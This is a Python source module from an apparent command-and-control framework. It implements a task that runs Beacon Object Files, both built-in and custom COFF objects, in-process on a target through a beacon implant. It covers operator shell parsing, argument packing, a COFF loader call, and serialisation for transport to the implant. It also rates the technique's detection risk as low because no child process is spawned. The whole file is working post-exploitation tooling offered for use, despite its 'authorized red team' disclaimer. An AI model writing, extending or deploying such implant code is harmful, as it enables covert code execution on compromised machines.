"""Task: BOF Execution — Run Beacon Object Files in-process.

Supports:
    - Built-in BOFs (Python native, cross-platform)
    - Custom COFF BOFs (.o files, Windows targets)
    - Argument packing via BeaconDataPacker

Usage from operator shell:
    beacon> bof whoami
    beacon> bof netstat
    beacon> bof ps
    beacon> bof /path/to/custom.o arg1 arg2
    beacon> bof ls /tmp

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
import logging
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from forge_c2.tasks.base_task import BaseTask, TaskResult, TaskStatus

log = logging.getLogger("forge.c2.task.bof")


@dataclass
class BOFTaskConfig:
    """Configuration for a BOF execution task."""
    bof_name: str = ""           # Built-in BOF name or "custom"
    bof_path: str = ""           # Path to .o file (custom BOFs)
    bof_data: bytes = b""        # Raw COFF data (for inline delivery)
    args: list[str] = field(default_factory=list)
    entry_point: str = "go"      # COFF entry point function


class TaskBOF(BaseTask):
    """Execute a BOF (Beacon Object File) on the target.

    Handles both built-in (Python) and custom (COFF) BOFs.
    """

    TASK_TYPE = "bof"
    DESCRIPTION = "Execute a Beacon Object File (built-in or custom COFF)"
    OPSEC_RISK = "low"  # BOFs run in-process, no child process

    def __init__(self, config: BOFTaskConfig | dict | None = None, **kwargs: Any) -> None:
        super().__init__(**kwargs)
        if isinstance(config, dict):
            self.config = BOFTaskConfig(**config)
        elif config is None:
            self.config = BOFTaskConfig()
        else:
            self.config = config

    async def execute(self, **kwargs: Any) -> TaskResult:
        """Execute the BOF task."""
        start = time.time()

        bof_name = self.config.bof_name or kwargs.get("bof_name", "")
        bof_path = self.config.bof_path or kwargs.get("bof_path", "")
        bof_data = self.config.bof_data or kwargs.get("bof_data", b"")
        args = self.config.args or kwargs.get("args", [])

        if not bof_name and not bof_path and not bof_data:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                output="",
                error="No BOF specified. Use: bof <name> or bof <path.o>",
                started_at=start,
                completed_at=time.time(),
            )

        # Try built-in BOFs first
        if bof_name and not bof_path and not bof_data:
            return await self._run_builtin(bof_name, args, start)

        # Custom COFF BOF
        return await self._run_coff(bof_name, bof_path, bof_data, args, start)

    async def _run_builtin(
        self,
        name: str,
        args: list[str],
        start: float,
    ) -> TaskResult:
        """Execute a built-in BOF."""
        from forge_c2.bof.builtins import run_builtin_bof, BUILTIN_BOFS

        if name not in BUILTIN_BOFS:
            # Maybe it's a path to a .o file?
            if Path(name).suffix in (".o", ".obj", ".coff"):
                return await self._run_coff(name, name, b"", args, start)

            available = ", ".join(BUILTIN_BOFS.keys())
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                output="",
                error=f"Unknown BOF: {name}\nAvailable: {available}",
                started_at=start,
                completed_at=time.time(),
            )

        log.info("Executing built-in BOF: %s %s", name, " ".join(args))
        exit_code, output = run_builtin_bof(name, args)

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED if exit_code == 0 else TaskStatus.FAILED,
            output=output,
            error="" if exit_code == 0 else f"BOF exited with code {exit_code}",
            started_at=start,
            completed_at=time.time(),
        )

    async def _run_coff(
        self,
        name: str,
        path: str,
        data: bytes,
        args: list[str],
        start: float,
    ) -> TaskResult:
        """Execute a custom COFF BOF."""
        from forge_c2.bof.bof_loader import BOFLoader
        from forge_c2.bof.bof_api import BeaconAPI, BeaconDataPacker

        # Load COFF data
        if not data:
            coff_path = Path(path)
            if not coff_path.exists():
                return TaskResult(
                    task_id=self.task_id,
                    status=TaskStatus.FAILED,
                    output="",
                    error=f"COFF file not found: {path}",
                    started_at=start,
                    completed_at=time.time(),
                )
            data = coff_path.read_bytes()

        # Pack arguments
        packer = BeaconDataPacker()
        for arg in args:
            try:
                packer.add_int(int(arg))
            except ValueError:
                packer.add_str(arg)
        packed_args = packer.build()

        # Execute
        api = BeaconAPI()
        loader = BOFLoader(beacon_api=api)
        result = loader.load_and_execute(
            data,
            args=packed_args,
            entry_point=self.config.entry_point,
        )

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED if result.success else TaskStatus.FAILED,
            output=result.output,
            error=result.error,
            started_at=start,
            completed_at=time.time(),
        )

    @classmethod
    def from_operator_input(cls, raw_input: str) -> "TaskBOF":
        """Parse operator shell input into a BOF task.

        Input formats:
            bof whoami
            bof ls /tmp
            bof /path/to/custom.o arg1 arg2
            bof netstat -t
        """
        parts = raw_input.strip().split()

        # Remove "bof" prefix if present
        if parts and parts[0].lower() == "bof":
            parts = parts[1:]

        if not parts:
            return cls(BOFTaskConfig())

        name = parts[0]
        args = parts[1:]

        # Is it a file path?
        if Path(name).suffix in (".o", ".obj", ".coff") or "/" in name or "\\" in name:
            return cls(BOFTaskConfig(
                bof_name="custom",
                bof_path=name,
                args=args,
            ))

        return cls(BOFTaskConfig(
            bof_name=name,
            args=args,
        ))

    def to_dict(self) -> dict[str, Any]:
        """Serialize for network transmission."""
        return {
            "task": self.TASK_TYPE,
            "bof_name": self.config.bof_name,
            "bof_path": self.config.bof_path,
            "bof_data_b64": base64.b64encode(self.config.bof_data).decode() if self.config.bof_data else "",
            "args": self.config.args,
            "entry_point": self.config.entry_point,
        }

    def encode(self) -> bytes:
        """Serialize for transport to beacon."""
        import json
        return json.dumps(self.to_dict(), default=str).encode()

    @classmethod
    def decode(cls, data: bytes) -> "TaskBOF":
        """Deserialize from transport."""
        import json
        d = json.loads(data)
        config = BOFTaskConfig(
            bof_name=d.get("bof_name", ""),
            bof_path=d.get("bof_path", ""),
            bof_data=base64.b64decode(d["bof_data_b64"]) if d.get("bof_data_b64") else b"",
            args=d.get("args", []),
            entry_point=d.get("entry_point", "go"),
        )
        return cls(config)
